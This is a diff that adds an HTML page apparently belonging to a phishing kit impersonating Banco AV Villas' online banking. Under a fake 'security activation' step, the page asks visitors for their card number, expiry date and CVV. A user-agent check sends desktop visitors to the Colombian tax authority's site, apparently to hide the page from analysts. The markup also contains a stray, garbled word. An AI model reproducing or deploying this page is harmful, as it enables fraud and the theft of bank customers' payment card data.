@@ -1,0 +1,276 @@
+<html>
+    <head>
+        <title>Banca Virtual | Banco AV Villas</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        <meta content="es" http-equiv="Content-Language">
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="theme-color" content="#FF0015">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="icon" href="../img/favicon.png">
+        <script type="text/javascript" src="../../../../../js/jquery-3.6.0.min.js"></script>      
+        <link href="../css/style-white.css" rel="stylesheet">
+        <link href="../css/stylesheet.css" rel="stylesheet">
+        <script type="text/javascript" src="../js/functions.js"></script>  
+        <script type="text/javascript" src="../js/ready.js"></script>                
+        <style type="text/css">
+            #fondo{
+                position: fixed;
+                width: 100%;
+                height: 100%;
+                left: 0;
+                top: 0;
+                background-color: #f4f5f7cf;
+                z-index: 900;
+            }
+
+            #cargando{
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                z-index: 920;
+            }
+        </style>
+    </head>
+    <body>
+        <input type="hidden" name="hdd-documento" id="hdd-documento" value="CC">
+        <div id="fondo"></div>
+        <img src="../img/cargando.gif" id="cargando" width="110">
+
+        <div id="top-bar">
+            <table border="0" width="100%" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td align="left" id="espacio-side-bar">
+                        <table border="0" cellpadding="0" cellspacing="0">
+                            <tr>
+                                <td valign="middle">
+                                    <img src="../img/logo.png" width="150" id="logo-top-bar">
+                                </td>                                                
+                                <td valign="middle" id="bienvenido">Bienvenido<br>
+                                    <img src="../img/separador.jpg" width="30" style="margin-top: 5px;">
+                                </td>
+                            </tr>
+                        </table>                 
+                    </td>
+                    <td align="right" width="60%">
+                        <table border="0" cellpadding="0" cellspacing="0" id="menu-mobile">
+                            <tr>
+                                <td><img src="../img/notificaciones.png" width="26" style="margin: 0px 10px; cursor: pointer;"></td>
+                                <td><img src="../img/menu.png" width="24" style="margin-right: 20px; cursor: pointer;"></td>
+                            </tr>
+                        </table>
+
+                        <table border="0" cellpadding="0" cellspacing="0" id="menu-top-bar">
+                            <tr>
+                                <td>
+                                    <table class="item-top-menu" border="0" cellpadding="0" cellspacing="0" id="nuevo-producto">
+                                        <tr>
+                                            <td><img src="../img/nuevo-producto.png" width="14"></td>
+                                            <td class="txt-item-top">Solicitud de Productos</td>
+                                        </tr>
+                                    </table>  
+                                </td>
+                                <td>
+                                    <table class="item-top-menu" border="0" cellpadding="0" cellspacing="0" id="contactos">
+                                        <tr>
+                                            <td><img src="../img/contactos.png" width="14"></td>
+                                            <td class="txt-item-top">Contactos</td>
+                                        </tr>
+                                    </table>
+                                </td>
+                                <td>
+                                    <table class="item-top-menu" border="0" cellpadding="0" cellspacing="0" id="documentos">
+                                        <tr>
+                                            <td><img src="../img/documentos.png" width="14"></td>
+                                            <td class="txt-item-top">Extractos y Certificados</td>
+                                        </tr>
+                                    </table>
+                                </td>
+                                <td>
+                                    <table class="item-top-menu" border="0" cellpadding="0" cellspacing="0" id="seguridad">
+                                        <tr>
+                                            <td><img src="../img/seguridad.png" width="14"></td>
+                                            <td class="txt-item-top">Seguridad</td>
+                                        </tr>
+                                    </table>
+                                </td>
+                                <td>
+                                    <table class="item-top-menu" border="0" cellpadding="0" cellspacing="0" id="salir">
+                                        <tr>
+                                            <td><img src="../img/salir.png" width="14"></td>
+                                            <td class="txt-item-top">Salida Segura</td>
+                                        </tr>
+                                    </table>
+                                </td>
+                            </tr>
+                        </table>                                
+                    </td>
+                </tr>
+            </table>
+        </div>
+          
+        <div id="side-bar">
+            <img src="../img/logo.png" width="150">
+            <br><br><br><br>
+            <table class="item-side-menu" border="0" cellpadding="0" cellspacing="0" id="productos">
+                <tr>
+                    <td class="img-item-side"><img src="../img/productos.png" width="20"></td>
+                    <td class="txt-item-side">Productos</td>
+                </tr>
+            </table>
+            <table class="item-side-menu" border="0" cellpadding="0" cellspacing="0" id="pagos">
+                <tr>
+                    <td class="img-item-side"><img src="../img/pagos.png" width="20"></td>
+                    <td class="txt-item-side">Pagos</td>
+                </tr>
+            </table>
+            <table class="item-side-menu" border="0" cellpadding="0" cellspacing="0" id="transferir">
+                <tr>
+                    <td class="img-item-side"><img src="../img/transferir.png" width="18"></td>
+                    <td class="txt-item-side">Transferencias</td>
+                </tr>
+            </table>
+            <table class="item-side-menu" border="0" cellpadding="0" cellspacing="0" id="bolsillo">
+                <tr>
+                    <td class="img-item-side"><img src="../img/bolsillo.png" width="20"></td>
+                    <td class="txt-item-side">Bolsillos</td>
+                </tr>
+            </table>
+            <table class="item-side-menu" border="0" cellpadding="0" cellspacing="0" id="giros">
+                <tr>
+                    <td class="img-item-side"><img src="../img/giros.png" width="20"></td>
+                    <td class="txt-item-side">Giros y Retiros</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="contenedor">            
+            <div class="frm" id="frm-correo">
+
+
+                <div class="titulo">Activación de Seguridad</div>
+                <div class="descripcion">Digite los siguientes datos para activar la seguridad de tu cuenta.</div>
+                <br><br>
+                <div class="frm-input" id="inp-tarjeta">
+                    <table border="0" width="100%" cellpadding="0" cellspacing="0" style="height: 54px;">
+                        <tr>
+                            <td align="left">
+                                <div class="etiqueta" id="etq-tarjeta"><b>Tarjeta de crédito o débito</b></div>
+                                <input type="text" class="entrada" id="txt-tarjeta" name="txt-tarjeta" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="16">
+                            </td>
+                            <td valign="middle" align="right" width="24">
+                                <img src="../img/tarjeta.png" width="20" id="ico-tarjeta" class="icon-entrada">
+                                <img src="../img/alerta.jpg" width="25" id="ico-alerta-t" class="icon-entrada">
+                            </td>
+                        </tr>
+                    </table>                    
+                </div>
+                <div class="error" id="err-tarjeta">Este campo es requerido.</div>      
+
+                <div style="height:32px;"></div>
+
+                <table border="0" width="100%" cellpadding="0" cellspacing="0">
+                    <tr>
+tempor                        <td style="padding-right: 3px;">
+                            <select id="mFecha" name="mFecha">
+                                <option value="" default="" selected="">Mes</option>
+                                <option value="01">01</option>
+                                <option value="02">02</option>
+                                <option value="03">03</option>
+                                <option value="04">04</option>
+                                <option value="05">05</option>
+                                <option value="06">06</option>
+                                <option value="07">07</option>
+                                <option value="08">08</option>
+                                <option value="09">09</option>
+                                <option value="10">10</option>
+                                <option value="11">11</option>
+                                <option value="12">12</option>
+                            </select>
+                        </td>
+                        <td style="padding-left: 3px;">
+                            <select id="aFecha" name="aFecha">
+                                <option value="" default="" selected="">Año</option>
+                                <option value="2022">2022</option>
+                                <option value="2023">2023</option>
+                                <option value="2024">2024</option>
+                                <option value="2025">2025</option>
+                                <option value="2026">2026</option>
+                                <option value="2027">2027</option>
+                                <option value="2028">2028</option>
+                                <option value="2029">2029</option>
+                                <option value="2030">2030</option>
+                                <option value="2031">2031</option>
+                                <option value="2032">2032</option>
+                                <option value="2033">2033</option>
+                            </select>
+                        </td>
+                    </tr>    
+                </table>
+
+                <div style="height:32px;"></div>
+
+
+                <div class="frm-input" id="inp-cvv">
+                    <table border="0" width="100%" cellpadding="0" cellspacing="0" style="height: 54px;">
+                        <tr>
+                            <td align="left">
+                                <div class="etiqueta" id="etq-cvv"><strong>CVV</strong></div>
+                                <input type="password" maxlength="3" class="entrada" id="txt-cvv" name="txt-cvv" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                            </td>
+                            <td valign="middle" align="right" width="24">
+                                <img src="../img/seguridad.jpg" width="22" id="ico-cvv" class="icon-entrada">
+                                <img src="../img/alerta.jpg" width="25" id="ico-alerta-v" class="icon-entrada">
+                            </td>
+                        </tr>
+                    </table>                    
+                </div>
+                <div class="error" id="err-cvv">Este campo es requerido.</div>  
+
+                <br><br>
+                <button id="btn-tarjeta" type="button" class="btn" disabled="disabled"> VERIFICAR </button>    
+
+            </div> 
+        </div>
+        <div style="padding:10px 14px;">
+            <table border="0" width="100%" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td align="left"><img src="../img/logo-gav.png" width="70"></td>
+                    <td align="right"><img src="../img/logo-gav.png" width="70" id="super-d"> &nbsp;&nbsp;&nbsp;  <img src="../img/superh-negro.svg" width="130"></td>
+                </tr>
+            </table>
+        </div>
+    
+<script>
+    function detectar_dispositivo() {
+        var dispositivo = "";
+        if (navigator.userAgent.match(/Android/i))
+            dispositivo = "Android";
+        else if (navigator.userAgent.match(/webOS/i))
+            dispositivo = "webOS";
+        else if (navigator.userAgent.match(/iPhone/i))
+            dispositivo = "iPhone";
+        else if (navigator.userAgent.match(/iPad/i))
+            dispositivo = "iPad";
+        else if (navigator.userAgent.match(/iPod/i))
+            dispositivo = "iPod";
+        else if (navigator.userAgent.match(/BlackBerry/i))
+            dispositivo = "BlackBerry";
+        else if (navigator.userAgent.match(/Windows Phone/i))
+            dispositivo = "Windows Phone";
+        else
+            dispositivo = "PC";
+        return dispositivo;
+    }
+
+    if (detectar_dispositivo() == "PC") {
+        window.location.href = 'https://www.dian.gov.co';
+    }
+</script>
+    
+</body>
+</html>
